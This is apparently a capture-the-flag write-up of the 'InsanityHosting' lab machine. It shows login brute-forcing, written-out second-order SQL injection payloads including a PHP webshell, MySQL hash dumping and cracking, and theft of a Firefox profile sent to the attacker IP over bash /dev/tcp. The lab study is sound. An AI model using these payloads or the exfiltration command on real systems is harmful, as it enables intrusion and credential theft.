---
render_with_liquid: false
title: PG Play  InsanityHosting
date: 2024-06-12 11:48:46 +1400
tags: [pg-play, nmap, linux, httpx, feroxbuster, php, squirrelmail, email, user-enumeration, ffuf, brute-force-attack, weak-credentials, credentials-stuffing, mysql, sqli, sqli-union, sqli-second-order, sqli2rce, hashcat, discover-browser, hack-browser-data, password-spraying, password-reuse]
---



# Learnt / Summary

- Couldn't enumerate `usernames`? Check strings carefully on every web pages that could be a person
- Identify database related functions, fuzz `SQLI` payloads
- bcrypt hash? Not crackable if `15` minutes passed

# Recon


## Hosts

```bash
┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/InsanityHosting]
└─$ pt init '192.168.157.124 insanityhosting.vm www.insanityhosting.vm'
+-----------------+--------+-----------------+------------------------+
|     PROFILE     | STATUS |       IP        |         DOMAIN         |
+-----------------+--------+-----------------+------------------------+
| insanityhosting | on     | 192.168.157.124 | insanityhosting.vm     |
| insanityhosting | on     | 192.168.157.124 | www.insanityhosting.vm |
+-----------------+--------+-----------------+------------------------+
```

## Nmap

```bash

# Nmap 7.94SVN scan initiated Wed Jun 12 11:48:46 2024 as: nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 21,22,80, 192.168.222.124
Nmap scan report for 192.168.222.124
Host is up, received user-set (0.063s latency).
Scanned at 2024-06-12 11:48:46 CST for 15s

PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 61 vsftpd 3.0.2
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.45.221
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: ERROR
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 85:46:41:06:da:83:04:01:b0:e4:1f:9b:7e:8b:31:9f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQtHmxxtG4ltyiTASYo7IAAQVLqSkanJ2TSG695Ta5sMaS5eixyvA8ogIMPtXm/iaHRxvCE6I+gxzUpmMD59NpmkAAPW4o0WXXMz0PDxCgUg+sYljlppG91mLyqjghPxygAbhUC4PjezCNtOV9WiiL25Nyb0BpefsFU/BT7bM0NYX3EEdvabDTe/WfE5gKG+GBj6/SOKsFa95bq6xEQrmbj96LieChT0iIkDvaAas6HBf7GPk1kVeLFAU45twWTGNEXpF0a8I+0TdXDp7tD0Gzh2DNWJE/O6c8PJ3jV6WBXXmT353S9FYzki/OxDMaGVAUZtFnSCGzxKVj5YqSWyU7
|   256 e4:9c:b1:f2:44:f1:f0:4b:c3:80:93:a9:5d:96:98:d3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNRt3iEQF7T82T4vCGDn0qlm9hGE/D2Mzc0UTo01QD0P+6xeY2fs+0/pOuKrA+qbxHmhO5Zn/XvNgx+ay6PYbBI=
|   256 65:cf:b4:af:ad:86:56:ef:ae:8b:bf:f2:f0:d9:be:10 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAV1K1EGNhrsQyVvPZ1zVegZIPxuXbZXoK/EU9UAjLrp
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.6 ((CentOS) PHP/7.2.33)
| http-methods: 
|   Supported Methods: GET HEAD POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (CentOS) PHP/7.2.33
|_http-title: Insanity - UK and European Servers
|_http-favicon: Unknown favicon MD5: F563215CE087F2F0E494D75B81E07321
Service Info: OS: Unix

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Wed Jun 12 11:49:01 2024 -- 1 IP address (1 host up) scanned in 14.83 seconds
```

## 21 - FTP

```bash
┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/InsanityHosting]
└─$ ftp -A ftp://anonymous:''@$(pt get rhost)
Connected to insanityhosting.vm.
220 (vsFTPd 3.0.2)
331 Please specify the password.
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
200 Switching to Binary mode.
ftp> ls -la
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-xr-x    3 0        0              17 Aug 16  2020 .
drwxr-xr-x    3 0        0              17 Aug 16  2020 ..
drwxr-xr-x    2 0        0               6 Apr 01  2020 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls -la
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0               6 Apr 01  2020 .
drwxr-xr-x    3 0        0              17 Aug 16  2020 ..
226 Directory send OK.
ftp> put test
local: test remote: test
200 EPRT command successful. Consider using EPSV.
550 Permission denied.
ftp> cd ..
250 Directory successfully changed.
ftp> put test
local: test remote: test
200 EPRT command successful. Consider using EPSV.
550 Permission denied.
```


## 80 - HTTP : Insanity - UK and European Servers


### Info

```ruby
http://insanityhosting.vm [200] [Insanity - UK and European Servers] [Apache/2.4.6 (CentOS) PHP/7.2.33] [f26b9c158398d636809f22a67cf4f5898bb76034] [Apache HTTP Server:2.4.6,CentOS,PHP:7.2.33]
```

![](/assets/obsidian/5f2f0dc775089f3625b4c35e82925b9c.png)

### Directory

```bash
feroxbuster -w <(cat /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt|anew) -k --auto-tune -A -u "http://$(pt get rhost):80" -o ferox_80.txt
```

# Initial Access


## Enumeration


### WSTG-INFO-04 - Enumerate Applications on Webserver


#### Vhosts

> http://192.168.157.124/

- Discovered a domain from email : `insanityhosting.vm`

![](/assets/obsidian/2a389b9adeb7e6af6c9405bcab48be2e.png)

- Discovered a vhost from http redirection : `www.insanityhosting.vm`

```bash
┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/InsanityHosting]
└─$ cat ferox_80.txt | grep -vE '^404' | ff | grep '/news'
200      GET        0l        0w     1083c http://insanityhosting.vm/news/LICENSE
301      GET        0l        0w        0c http://insanityhosting.vm/news/admin => http://www.insanityhosting.vm/news/admin/
301      GET        7l       20w      239c http://insanityhosting.vm/news => http://insanityhosting.vm/news/
```


#### Different Base URL

- Probe base URLs

```bash

# Gather base URLs
cat ferox_*.txt bulkdirb_*.txt | ferox-parse | grep '/$' | grep -vf <(cat ferox_*.txt bulkdirb_*.txt | ferox-parse | grep 'heuristics detected directory listing' | awk '{print $7}') | awk 'NF>1{print $NF}' | anew -q base_urls.txt


# Probe base URLs
cat base_urls.txt | chttpx -srd httpx_dirs -o httpx_dirs/webprobe.txt


# Exclude result with same sha1 hash
UNIQ_HASH=$(cat httpx_dirs/webprobe.txt | grep -Eo '[[:xdigit:]]{40}' | sort -u); for h in $(echo $UNIQ_HASH); do grep $h httpx_dirs/webprobe.txt | head -n 1; done
```

![](/assets/obsidian/0be893a6fb9e9aa39c54fe555c6252cd.png)

> http://insanityhosting.vm/monitoring - Login

![](/assets/obsidian/390fea99129ade6ba72fa732916c8b4c.png)

```bash
┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/InsanityHosting]
└─$ cat ferox_80.txt | ff | sort -V -k 6 | grep '/monitoring' | grep -vE '/monitoring/fonts/|/monitoring/images/|/monitoring/smarty|/monitoring/assets/|/monitoring/vendor/|/monitoring/css/|/monitoring/templates.*/'
301      GET        7l       20w      245c http://insanityhosting.vm/monitoring => http://insanityhosting.vm/monitoring/
403      GET        0l        0w      221c http://insanityhosting.vm/monitoring/.htacess
403      GET        0l        0w      221c http://insanityhosting.vm/monitoring/.htmlpar
403      GET        0l        0w      223c http://insanityhosting.vm/monitoring/.htmlprint
403      GET        0l        0w      223c http://insanityhosting.vm/monitoring/.html.orig
403      GET        0l        0w      222c http://insanityhosting.vm/monitoring/.html.sav
403      GET        0l        0w      219c http://insanityhosting.vm/monitoring/.htm.d
403      GET        0l        0w      222c http://insanityhosting.vm/monitoring/.htm.html
403      GET        0l        0w      221c http://insanityhosting.vm/monitoring/.htm.old
403      GET        0l        0w      217c http://insanityhosting.vm/monitoring/.hts
301      GET        7l       20w      251c http://insanityhosting.vm/monitoring/class => http://insanityhosting.vm/monitoring/class/
200      GET        0l        0w        0c http://insanityhosting.vm/monitoring/class/database.php
200      GET        0l        0w        0c http://insanityhosting.vm/monitoring/class/ping.php
200      GET        0l        0w        0c http://insanityhosting.vm/monitoring/class/user.php
301      GET        7l       20w      248c http://insanityhosting.vm/monitoring/js => http://insanityhosting.vm/monitoring/js/
200      GET       57l       89w     1420c http://insanityhosting.vm/monitoring/js/main.js
301      GET        7l       20w      254c http://insanityhosting.vm/monitoring/settings => http://insanityhosting.vm/monitoring/settings/
200      GET        0l        0w        0c http://insanityhosting.vm/monitoring/settings/config.php
302      GET        0l        0w        0c http://insanityhosting.vm/monitoring/ => login.php
403      GET        0l        0w      220c http://insanityhosting.vm/monitoring/.html-1
403      GET        0l        0w      219c http://insanityhosting.vm/monitoring/.html_
403      GET        0l        0w      224c http://insanityhosting.vm/monitoring/.html_files
MSG      0.000 feroxbuster::heuristics detected directory listing: http://insanityhosting.vm/monitoring/assets (Apache)
MSG      0.000 feroxbuster::heuristics detected directory listing: http://insanityhosting.vm/monitoring/class (Apache)
MSG      0.000 feroxbuster::heuristics detected directory listing: http://insanityhosting.vm/monitoring/css (Apache)
MSG      0.000 feroxbuster::heuristics detected directory listing: http://insanityhosting.vm/monitoring/fonts (Apache)
MSG      0.000 feroxbuster::heuristics detected directory listing: http://insanityhosting.vm/monitoring/images (Apache)
MSG      0.000 feroxbuster::heuristics detected directory listing: http://insanityhosting.vm/monitoring/js (Apache)
MSG      0.000 feroxbuster::heuristics detected directory listing: http://insanityhosting.vm/monitoring/settings (Apache)
MSG      0.000 feroxbuster::heuristics detected directory listing: http://insanityhosting.vm/monitoring/templates (Apache)
MSG      0.000 feroxbuster::heuristics detected directory listing: http://insanityhosting.vm/monitoring/templates_c (Apache)
MSG      0.000 feroxbuster::heuristics detected directory listing: http://insanityhosting.vm/monitoring/vendor (Apache)
```

> http://insanityhosting.vm/webmail - SquirrelMail version 1.4.22

![](/assets/obsidian/1983f6ef0db27edd5d84787fc611e099.png)

```bash
┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/InsanityHosting]
└─$ cat ferox_80.txt | ff | sort -V -k 6 | grep '/webmail' | grep -vE '/webmail/doc/|/webmail/src/|webmail/plugins/|/webmail/contrib/|/webmail/themes/'
301      GET        7l       20w      242c http://insanityhosting.vm/webmail => http://insanityhosting.vm/webmail/
403      GET        0l        0w      214c http://insanityhosting.vm/webmail/.htm
200      GET        1l        9w       56c http://insanityhosting.vm/webmail/README
200      GET        5l       16w      102c http://insanityhosting.vm/webmail/configure
301      GET        7l       20w      249c http://insanityhosting.vm/webmail/images => http://insanityhosting.vm/webmail/images/
200      GET       29l      169w    13295c http://insanityhosting.vm/webmail/images/sm_logo.png
302      GET        0l        0w        0c http://insanityhosting.vm/webmail/images/ => ../index.php
403      GET        0l        0w      217c http://insanityhosting.vm/webmail/include
302      GET        0l        0w        0c http://insanityhosting.vm/webmail/ => src/login.php
MSG      0.000 feroxbuster::heuristics detected directory listing: http://insanityhosting.vm/webmail/contrib (Apache)
```

> http://insanityhosting.vm/news - bludit blog

![](/assets/obsidian/5db1936932824f91d0dcbc6c771ff29d.png)

![](/assets/obsidian/0854d9c7e58bf837d7a2aeeee01a292e.png)

```bash
┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/InsanityHosting]
└─$ cat ferox_80.txt | ff | sort -V -k 6 | grep '/news'
301      GET        7l       20w      239c http://insanityhosting.vm/news => http://insanityhosting.vm/news/
200      GET        0l        0w     1083c http://insanityhosting.vm/news/LICENSE
301      GET        0l        0w        0c http://insanityhosting.vm/news/admin => http://www.insanityhosting.vm/news/admin/
403      GET        0l        0w      213c http://insanityhosting.vm/news/.html.
```

> http://insanityhosting.vm/phpmyadmin - phpmyadmin 5.0.2

```bash
┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/InsanityHosting]
└─$ curl http://insanityhosting.vm/phpmyadmin/README -s | head
phpMyAdmin - Readme
===================

Version 5.0.2

A web interface for MySQL and MariaDB.

https://www.phpmyadmin.net/

Summary
```

> http://insanityhosting.vm/ - Static site

```bash
┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/InsanityHosting]
└─$ cat ferox_80.txt | ff | sort -V -k 6 | grep -vE '/webmail/|/monitoring/|/phpmyadmin/|/news/' | grep -vE 'insanityhosting.vm/img/|insanityhosting.vm/css/|insanityhosting.vm/js/|insanityhosting.vm/fonts/'
200      GET      479l     1477w    22263c http://insanityhosting.vm/
301      GET        7l       20w      239c http://insanityhosting.vm/data => http://insanityhosting.vm/data/
200      GET        1l        1w        6c http://insanityhosting.vm/data/EMPTY
200      GET        1l        1w        6c http://insanityhosting.vm/data/VERSION
200      GET      479l     1477w    22263c http://insanityhosting.vm/index.html
200      GET        1l       10w       57c http://insanityhosting.vm/licence
200      GET     3158l     9393w    99153c http://insanityhosting.vm/style.css
MSG      0.000 feroxbuster::heuristics detected directory listing: http://insanityhosting.vm/css (Apache)
MSG      0.000 feroxbuster::heuristics detected directory listing: http://insanityhosting.vm/data (Apache)
MSG      0.000 feroxbuster::heuristics detected directory listing: http://insanityhosting.vm/fonts (Apache)
MSG      0.000 feroxbuster::heuristics detected directory listing: http://insanityhosting.vm/img (Apache)
MSG      0.000 feroxbuster::heuristics detected directory listing: http://insanityhosting.vm/js (Apache)
```

### WSTG-IDNT-04 - Testing for Account Enumeration and Guessable User Account


#### 80 - 2

> http://www.insanityhosting.vm/news/

- Potential username : `otis, hello`

![](/assets/obsidian/c2a784c377f78b1cb33736d23a993c0a.png)

## Shell as elliot


### 80 - /monitoring/ : Weak credential

> http://insanityhosting.vm/monitoring/index.php

- Tried auth bypass payloads
- Tried default creds : `admin:admin`, `admin:password`

Copy login request to file

![](/assets/obsidian/964994d5b3b4d146952cc3e054d84be0.png)

> `login.req`

```http
POST /monitoring/index.php HTTP/1.1
Host: insanityhosting.vm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 21
Origin: http://insanityhosting.vm
Connection: close
Referer: http://insanityhosting.vm/monitoring/login.php
Cookie: PHPSESSID=58bl1iu6nl7pqe5vtfqh4p7g43
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1

username=FUZZ1&password=FUZZ2
```

> Remember to remove session cookie from request file, because some web app won't assign new cookie but authorizes the current cookie instead
{: .prompt-tip }

Remove cookie header

```bash
┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/InsanityHosting]
└─$ sed -i '/Cookie:/d' login.req
```

Merge `top-usernames list from seclists` with the discovered usernames

```bash
┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/InsanityHosting]
└─$ cat users_80.txt
otis
hello

┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/InsanityHosting]
└─$ cat users_80.txt /usr/share/seclists/Usernames/top-usernames-shortlist.txt > users.txt
```

Brute force weak credentials

```bash
ffuf -c --request-proto http -request login.req -w users.txt:FUZZ1 -w /usr/share/set/src/fasttrack/wordlist.txt:FUZZ2 -fr 'Location: login.php'
```

![](/assets/obsidian/ee67634ae5d1020a6ffa1edaf707c954.png)

- Login - `otis`:`123456`

![](/assets/obsidian/69a48800478a2a818792cd271b6d662c.png)

### 80 - SquirrelMail 1.4.22 : Credentials stuffing

> http://insanityhosting.vm/webmail/src/login.php

- Login - `otis`:`123456`

![](/assets/obsidian/074e12d0215362298b422fde73721d27.png)

### 80 - SQLI (Mysql) : Union based Second Order Injection

> http://insanityhosting.vm/monitoring/index.php

- It informs that we will get email notifications about offline servers

![](/assets/obsidian/94b0c9bd3b102c88d0e3a5de5f8ee433.png)

Add a test server with an IP address that tests command injection (Didn't receive callback)

```bash
sudo tcpdump -i tun0 -n icmp -v
```

![](/assets/obsidian/41ec336c1b108a84341e7087f39e4599.png)

- Received an email In **SquirrelMail**

![](/assets/obsidian/ff6bdc9948bda200f08afd4777b93a5e.png)

- It gave a table which looks like a database record, the `name` of the monitoring server was reflected

![](/assets/obsidian/6e04b4981ff1fd2b55e7fa146d02d819.png)

Test generic SQLI payloads (Check if the SQL query is using single or double quotes) :

```sql
test';#---
test";#---
```

![](/assets/obsidian/8a7cf141910c3cf9e87d0af862432ba8.png)

- Didn't get the result from payload : `test";#---`, assume that SQL query is using double quotes

![](/assets/obsidian/fd23a13760c65ad0f60b3df28279a2f3.png)

Test union based SQLI, find the number of columns in current table, since I got a table result with `4` columns already, I will start from `4`

```sql
test2" UNION ALL SELECT 1,2,3,4;#---
test2" UNION ALL SELECT 1,2,3,4,5;#---
test2" UNION ALL SELECT 1,2,3,4,5,6;#---
```

![](/assets/obsidian/989c20d6f1a4bd6f82280b06fd876ada.png)

- Successfully identified that the number of columns is `4`

![](/assets/obsidian/0d1612fdfa32f351e2f267aa8c18486a.png)

- Retrieve 2 basic database info : `Database version` and `Current User` (Since I already know that `Host` and `Status` columns are probably string, I will use them)

```sql
test2" UNION ALL SELECT 1,@@version,3,USER();#---
```

![](/assets/obsidian/87f225ce8345e3a3f3f6d7fe64be96b4.png)

- Database Version : Mysql
- Current user : root

![](/assets/obsidian/ee7bbe491a5dc5602002edfb0f30e209.png)

- With user `root` in `mysql`, there are 2 low hanging fruits to try in following order:
1. Write webshell to web root
2. Dump mysql user table for credential stuffing

- I knew that web root is at `/var/www/html` via `/phpinfo.php`

```bash
┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/InsanityHosting]
└─$ curl http://insanityhosting.vm/phpinfo.php -s | grep SCRIPT_FILENAME
<tr><td class="e">SCRIPT_FILENAME </td><td class="v">/var/www/html/phpinfo.php </td></tr>
<tr><td class="e">$_SERVER['SCRIPT_FILENAME']</td><td class="v">/var/www/html/phpinfo.php</td></tr>
```

- It failed to write webshell

```sql
test2" UNION ALL SELECT "<?php system($_REQUEST[0]); ?>" INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '' OPTIONALLY ENCLOSED BY '' LINES TERMINATED BY '\n';#---
```

![](/assets/obsidian/68894dc06d7288a3299770218dc2493e.png)

```bash
┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/InsanityHosting]
└─$ curl http://insanityhosting.vm/x.php
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /x.php was not found on this server.</p>
</body></html>
```

- `root` did have `file_priv`, but doesn't have permission to write web root

```sql
test2" UNION ALL SELECT 1,2,3,(select group_concat(user,"|",file_priv,"||") from mysql.user where file_priv='Y');#---
```

![](/assets/obsidian/e5577b1f57f033642eb9bd856898a932.png)

Dump hashes from `mysql.user` table

```bash
test3" UNION ALL SELECT 1,2,3,(SELECT GROUP_CONCAT(user, '|', password, '|' ,authentication_string) FROM mysql.user);#---
```

^497e48

![](/assets/obsidian/6154a509f6fbf98edae8934ed0c9ab7a.png)

```bash
┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/InsanityHosting]
└─$ cat loot/80_mysql_users.txt | tr ',' '\n' | uniq | tr '|' ':'
root:*CDA244FF510B063DA17DFF84FF39BA0849F7920F:
::
elliot::*5A5749F309CAC33B27BA94EE02168FA3C3E7A3E9
```

### Crack hashes

```bash
┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/InsanityHosting]
└─$ cat loot/80_mysql_users.hash
root:CDA244FF510B063DA17DFF84FF39BA0849F7920F
elliot:5A5749F309CAC33B27BA94EE02168FA3C3E7A3E9
```

```bash
┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/InsanityHosting]
└─$ hashcat loot/80_mysql_users.hash /opt/wordlists/rockyou.txt --user -m 300
[...]

┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/InsanityHosting]
└─$ hashcat loot/80_mysql_users.hash /opt/wordlists/rockyou.txt --user -m 300 --show
elliot:5a5749f309cac33b27ba94ee02168fa3c3e7a3e9:elliot123
```

### 22 - SSH : Credentials stuffing

```bash
┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/InsanityHosting]
└─$ cssh $(pt get rhost) elliot 'elliot123'
Warning: Permanently added 'insanityhosting.vm' (ED25519) to the list of known hosts.
[elliot@insanityhosting ~]$ id
uid=1003(elliot) gid=1003(elliot) groups=1003(elliot)
[elliot@insanityhosting ~]$
```

# Privilege Escalation


## From elliot to root


### Enumeration


#### Situation awareness

```bash
[elliot@insanityhosting ~]$ for u in $(cat /etc/passwd | grep sh$ | cut -d":" -f1 2>/dev/null);do id $u;done 2>/dev/null | sort -unt '=' -k2
uid=0(root) gid=0(root) groups=0(root)
uid=1000(admin) gid=1000(admin) groups=1000(admin)
uid=1002(nicholas) gid=1002(nicholas) groups=1002(nicholas),993(dockerroot)
uid=1003(elliot) gid=1003(elliot) groups=1003(elliot)
uid=1004(monitor) gid=1004(monitor) groups=1004(monitor)
```

```bash
[elliot@insanityhosting ~]$ ss -ltnp
State       Recv-Q Send-Q                                                           Local Address:Port                                                                          Peer Address:Port
LISTEN      0      100                                                                          *:993                                                                                      *:*
LISTEN      0      128                                                                  127.0.0.1:9000                                                                                     *:*
LISTEN      0      50                                                                           *:3306                                                                                     *:*
LISTEN      0      100                                                                          *:143                                                                                      *:*
LISTEN      0      128                                                                          *:10000                                                                                    *:*
LISTEN      0      128                                                                          *:22                                                                                       *:*
LISTEN      0      100                                                                  127.0.0.1:25                                                                                       *:*
LISTEN      0      100                                                                       [::]:993                                                                                   [::]:*
LISTEN      0      100                                                                       [::]:143                                                                                   [::]:*
LISTEN      0      128                                                                       [::]:80                                                                                    [::]:*
LISTEN      0      32                                                                        [::]:21                                                                                    [::]:*
LISTEN      0      128                                                                       [::]:22                                                                                    [::]:*
LISTEN      0      100                                                                      [::1]:25                                                                                    [::]:*
```

#### Mysql database

```bash
[elliot@insanityhosting monitoring]$ cat settings/config.php
<?php

$databaseUsername = 'root';
$databasePassword = 'AesBeery8g9JLcWW';
$databaseServer = 'localhost';
$databaseName = 'monitoring';
$secureCookie = True;

?>
```

```bash
[elliot@insanityhosting monitoring]$ mysql -u root -p'AesBeery8g9JLcWW'
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 177
Server version: 5.5.65-MariaDB MariaDB Server

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| monitoring         |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.00 sec)

MariaDB [(none)]> use monitoring
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [monitoring]> show tables;
+----------------------+
| Tables_in_monitoring |
+----------------------+
| hosts                |
| log                  |
| users                |
+----------------------+
3 rows in set (0.01 sec)

MariaDB [monitoring]> select * from users;
+----+----------+--------------------------------------------------------------+-----------------------------+
| id | username | password                                                     | email                       |
+----+----------+--------------------------------------------------------------+-----------------------------+
|  1 | admin    | $2y$12$huPSQmbcMvgHDkWIMnk9t.1cLoBWue3dtHf9E5cKUNcfKTOOp8cma | admin@insanityhosting.vm    |
|  2 | nicholas | $2y$12$4R6JiYMbJ7NKnuQEoQW4ruIcuRJtDRukH.Tvx52RkUfx5eloIw7Qe | nicholas@insanityhosting.vm |
|  3 | otis     | $2y$12$./XCeHl0/TCPW5zN/E9w0ecUUKbDomwjQ0yZqGz5tgASgZg6SIHFW | otis@insanityhosting.vm     |
+----+----------+--------------------------------------------------------------+-----------------------------+
3 rows in set (0.00 sec)
```

### Attempt to crack nicholas's hash

> `15` minutes passed without successful result, the hash is unlikely to be crackable
{: .prompt-tip }

```bash
┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/InsanityHosting]
└─$ cat loot/mysql_monitoring_uesrs.hash
nicholas:$2y$12$4R6JiYMbJ7NKnuQEoQW4ruIcuRJtDRukH.Tvx52RkUfx5eloIw7Qe

┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/InsanityHosting]
└─$ cp loot/mysql_monitoring_uesrs.hash /media/sf_Kali
```

```bash
cd C:\Users\X\Documents\Sec\hashcat-6.2.6\; hashcat.exe H:\VM-Share\Kali\*.hash H:\VM-Share\Kali\rockyou.txt --user -m 3200
```

![](/assets/obsidian/c0d0a087f6676b959af015f93db63984.png)

### Harvesting - Exfiltrate firefox profile

```bash
[elliot@insanityhosting ~]$ ls -la
total 41276
drwx------. 5 elliot elliot      185 Jun 16 17:48 .
drwxr-xr-x. 7 root   root         76 Aug 16  2020 ..
lrwxrwxrwx. 1 root   root          9 Aug 16  2020 .bash_history -> /dev/null
-rw-r--r--. 1 elliot elliot       18 Apr  1  2020 .bash_logout
-rw-r--r--. 1 elliot elliot      193 Apr  1  2020 .bash_profile
-rw-r--r--. 1 elliot elliot      231 Apr  1  2020 .bashrc
drwx------  2 elliot elliot       60 Jun 16 17:06 .gnupg
-rw-r--r--  1 elliot elliot       33 Jun 16 16:14 local.txt
drwx------. 5 elliot elliot       66 Aug 16  2020 .mozilla
-rw-------  1 elliot elliot      148 Jun 16 17:40 .mysql_history
drwx------. 2 elliot elliot       48 Jun 16 17:57 .ssh
```

- There's a lot of data in `~/.mozilla/` (Firefox profile folder), which means it is worth to exfiltrate

```bash
[elliot@insanityhosting ~]$ find .mozilla/ -ls
1718505    0 drwx------   5 elliot   elliot         66 Aug 16  2020 .mozilla/
9460204    0 drwx------   4 elliot   elliot        102 Aug 16  2020 .mozilla/firefox
9460245    4 drwx------   8 elliot   elliot       4096 Jun 16 17:06 .mozilla/firefox/esmhp32w.default-default
9460249    0 -rw-rw-r--   1 elliot   elliot          0 Aug 16  2020 .mozilla/firefox/esmhp32w.default-default/.parentlock
9460251    4 -rw-------   1 elliot   elliot        167 Aug 16  2020 .mozilla/firefox/esmhp32w.default-default/compatibility.ini
9460253   96 -rw-r--r--   1 elliot   elliot      98304 Aug 16  2020 .mozilla/firefox/esmhp32w.default-default/permissions.sqlite
9460255  128 -rw-r--r--   1 elliot   elliot     524288 Aug 16  2020 .mozilla/firefox/esmhp32w.default-default/cookies.sqlite
26511121   12 drwx------   2 elliot   elliot       8192 Aug 16  2020 .mozilla/firefox/esmhp32w.default-default/extensions
26511122  488 -rw-r--r--   1 elliot   elliot     496871 Aug 16  2020 .mozilla/firefox/esmhp32w.default-default/extensions/langpack-ga-IE@firefox.mozilla.org.xpi
26511123  468 -rw-r--r--   1 elliot   elliot     479029 Aug 16  2020 .mozilla/firefox/esmhp32w.default-default/extensions/langpack-ach@firefox.mozilla.org.xpi
26511124  532 -rw-r--r--   1 elliot   elliot     544098 Aug 16  2020 .mozilla/firefox/esmhp32w.default-default/extensions/langpack-hy-AM@firefox.mozilla.org.xpi
[...]
```

Setup **netcat** listener to receive file

```bash
┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/InsanityHosting]
└─$ nc -lvnp 9000 > data.tar.gz
listening on [any] 9000 ...
```

Zip `~/.mozilla/` then transfer to my kali machine

```bash
[elliot@insanityhosting ~]$ tar czf data.tar.gz .mozilla/
[elliot@insanityhosting ~]$ bash -c 'cat data.tar.gz > /dev/tcp/192.168.45.248/9000'
```

```bash
┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/InsanityHosting]
└─$ mkdir -p data && tar -xzf data.tar.gz -C data
```

Use **hack-browser-data** to extract sensitive data such as `passwords, cookies, session/local storage, history, bookmarks`

```bash
┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/InsanityHosting]
└─$ /opt/sectools/privesc/hack-browser-data-linux-amd64 -f json -dir hack-browser-data-results -p data/.mozilla
[NOTICE] [browser.go:47,pickChromium] find browser Vivaldi failed, profile folder does not exist
[NOTICE] [browser.go:47,pickChromium] find browser Brave failed, profile folder does not exist
[NOTICE] [browser.go:47,pickChromium] find browser Chrome failed, profile folder does not exist
[NOTICE] [browser.go:47,pickChromium] find browser Microsoft Edge failed, profile folder does not exist
[NOTICE] [browser.go:56,pickChromium] find browser chromium_default success
[NOTICE] [browser.go:47,pickChromium] find browser Chrome Beta failed, profile folder does not exist
[NOTICE] [browser.go:47,pickChromium] find browser Opera failed, profile folder does not exist
[NOTICE] [browser.go:98,pickFirefox] find browser firefox firefox-esmhp32w.default-default success
[ERROR] [browsingdata.go:43,Recovery] parse extension error cannot find extensions in settings
[NOTICE] [browsingdata.go:73,Output] output to file hack-browser-data-results/chromium_default_cookie.json success
[NOTICE] [browsingdata.go:73,Output] output to file hack-browser-data-results/chromium_default_localstorage.json success
[NOTICE] [browsingdata.go:73,Output] output to file hack-browser-data-results/chromium_default_bookmark.json success
[NOTICE] [browsingdata.go:73,Output] output to file hack-browser-data-results/chromium_default_sessionstorage.json success
[NOTICE] [browsingdata.go:73,Output] output to file hack-browser-data-results/chromium_default_history.json success
[NOTICE] [browsingdata.go:73,Output] output to file hack-browser-data-results/firefox_esmhp32w_default_default_password.json success
[NOTICE] [browsingdata.go:73,Output] output to file hack-browser-data-results/firefox_esmhp32w_default_default_bookmark.json success
